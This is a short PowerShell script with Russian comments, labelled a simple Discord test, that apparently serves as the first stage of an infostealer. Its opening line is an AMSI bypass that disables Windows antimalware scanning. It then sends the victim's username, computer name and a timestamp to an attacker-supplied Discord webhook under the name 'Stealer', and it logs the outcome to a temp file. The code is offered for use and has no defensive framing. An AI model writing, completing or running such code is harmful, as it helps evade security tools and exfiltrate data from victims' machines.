# === ПРОСТОЙ ТЕСТ ДЛЯ DISCORD (2026) ===
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

$webhook = "https://discord.com/api/webhooks/ТОЙ_ПОЛНЫЙ_ВЕБХУК_URL_СЮДА"   # ← ВСТАВЬ СВОЙ ПОЛНЫЙ WEBHOOK

$payload = @{
content = "✅ ТЕСТОВОЕ СООБЩЕНИЕ`nПользователь: $($env:USERNAME)`nПК: $($env:COMPUTERNAME)`nВремя: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
username = "Stealer"
} | ConvertTo-Json

try {
Invoke-RestMethod -Uri $webhook `
-Method Post `
-Body $payload `
-ContentType "application/json" `
-UseBasicParsing `
-TimeoutSec 15

"✅ Успешно отправлено в Discord" | Out-File "$env:TEMP\stealer_test.txt" -Encoding utf8 -Force
}
catch {
"❌ Ошибка $($_.Exception.Response.StatusCode): $($_.Exception.Message)" | Out-File "$env:TEMP\stealer_test.txt" -Encoding utf8 -Force
if ($_.ErrorDetails.Message) {
"Детали: $($_.ErrorDetails.Message)" | Out-File "$env:TEMP\stealer_test.txt" -Encoding utf8 -Append
}
}

"Тест завершён: $(Get-Date)" | Out-File "$env:TEMP\stealer_test.txt" -Encoding utf8 -Append
